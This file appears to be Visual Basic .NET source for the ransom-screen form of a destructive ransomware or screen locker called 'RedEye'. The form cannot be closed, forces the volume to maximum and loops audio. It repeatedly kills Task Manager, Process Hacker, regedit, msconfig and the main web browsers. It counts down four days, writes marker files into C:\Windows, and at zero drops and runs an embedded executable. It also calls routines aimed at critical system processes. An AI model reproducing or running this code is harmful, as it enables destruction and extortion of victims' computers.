Imports System.Net.Mail
Imports System.Threading.Thread
Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Runtime.InteropServices
Imports Microsoft.Win32

Public Class Form2
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function
    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Private Sub Form2_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Me.Visible = True
    End Sub

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Countdown.Interval = 1000


        Label5.Text = Func1234()
        Timer3.Start()
        Lengthh.Hide()
        Dim pool As String = ""
        pool = ""

        pool = pool & "0123456789"
        pool = pool & "abcdefghijklmnopqrstuvwxyz"
        pool = pool & "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


        Dim count = 0
        Result.Text = ""

        Dim cc As New Random
        Dim strpos = ""
        While count <= Lengthh.Text
            strpos = cc.Next(0, pool.Length)

            Result.Text = Result.Text & pool(strpos)
            count = count + 1

        End While

        If File.Exists("C:\Windows\Detect.txt") Then
            Countdown.Interval = 1
            My.Computer.Audio.Stop()
            For a = 100 To 1 Step -1
                SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
            Next
            My.Computer.Audio.Play(My.Resources.redeye, AudioPlayMode.BackgroundLoop)
        Else
            For a = 100 To 1 Step -1
                SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
            Next
            My.Computer.Audio.Play(My.Resources.redeye, AudioPlayMode.BackgroundLoop)
        End If

        If File.Exists("C:\Windows\AfterMBR.txt") Then
            Timer4.Start()
        Else
            'Nothing
        End If


        Dim path As String = "C:\Windows\Detect.txt"
        Dim fs As FileStream = File.Create(path)
        Dim info As Byte() = New UTF8Encoding(True).GetBytes("Detect")
        fs.Write(info, 0, info.Length)
        fs.Close()

        Countdown.Start()

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Explorer()
        Csrss()
        Wininit()
        Userinit()
        Svchost()
        Winlogon()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        For Each a In Process.GetProcessesByName("ProcessHacker")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("procexp64")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("msconfig")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("taskmgr")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("chrome")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("firefox")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("regedit")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("opera")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("UserAccountControlSettings")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("yandex")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("microsoftedge")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("microsoftedgecp")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("iexplore")
            a.Kill()
        Next
    End Sub

    Private Sub Countdown_Tick(sender As Object, e As EventArgs) Handles Countdown.Tick
        Dim startdate As DateTime = DateTime.Parse(Date.Now)
        Dim enddate As DateTime = Today.AddDays(4) '4 tage
        Dim ts As TimeSpan = enddate.Subtract(startdate)
        Label3.Text = CStr(ts.Days) & " Days " & CStr(ts.Hours) & " Hours " & CStr(ts.Minutes) & " Minutes " & CStr(ts.Seconds) & " Seconds!"
        If ts.TotalSeconds = 300 Then
            Dim path As String = "C:\Windows\AfterMBR.txt"

            Dim fs As FileStream = File.Create(path)

            Dim info As Byte() = New UTF8Encoding(True).GetBytes("AfterMBR")
            fs.Write(info, 0, info.Length)
            fs.Close()
            My.Computer.Audio.Stop()
            For a = 100 To 1 Step -1
                SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
            Next
            My.Computer.Audio.Play(My.Resources.suicide, AudioPlayMode.BackgroundLoop)
        End If
        If ts.TotalSeconds = 0 Then
            Dim aakam031 As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Dim akam As String = aakam031 + "redeye.exe"
            IO.File.WriteAllBytes(akam, My.Resources.redeye1)
            Process.Start(akam)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form3.Show()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Form4.Show()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Form5.Show()
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Form6.Show()
    End Sub
End Class